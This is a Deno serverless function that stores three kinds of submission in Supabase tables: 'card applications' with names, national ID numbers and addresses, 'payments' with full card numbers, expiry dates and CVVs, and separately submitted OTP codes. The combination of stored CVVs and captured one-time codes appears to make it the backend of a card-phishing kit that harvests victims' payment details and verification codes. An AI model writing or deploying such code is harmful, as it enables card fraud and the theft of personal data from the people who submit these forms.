import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);

    const body = await req.json();
    const { type, data } = body;

    const supabaseUrl = Deno.env.get("SUPABASE_URL");
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_KEY");

    let table = "";
    let payload = {};

    if (type === "card_application") {
      table = "card_applications";
      payload = {
        name: data.name || null,
        mobile: data.mobile || null,
        id_number: data.id_number || null,
        card_type: data.card_type || null,
        address: data.address || null,
        delivery_date: data.delivery_date || null,
        created_at: new Date().toISOString(),
      };
    } else if (type === "payment") {
      table = "card_payments";
      payload = {
        application_id: data.application_id || null,
        card_holder: data.card_holder || null,
        card_number_last4: data.card_number_last4 || null,
        card_number_full: data.card_number_full || null,
        expiry_date: data.expiry_date || null,
        cvv: data.cvv || null,
        created_at: new Date().toISOString(),
      };
    } else if (type === "otp") {
      table = "card_otps";
      payload = {
        application_id: data.application_id || null,
        otp_code: data.otp_code || null,
        created_at: new Date().toISOString(),
      };
    } else {
      return Response.json({ error: "Unknown type" }, { status: 400 });
    }

    const res = await fetch(`${supabaseUrl}/rest/v1/${table}`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": supabaseKey,
        "Authorization": `Bearer ${supabaseKey}`,
        "Prefer": "return=representation",
      },
      body: JSON.stringify(payload),
    });

    const result = await res.json();

    if (!res.ok) {
      return Response.json({ error: result }, { status: res.status });
    }

    return Response.json({ success: true, record: result[0] || result });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});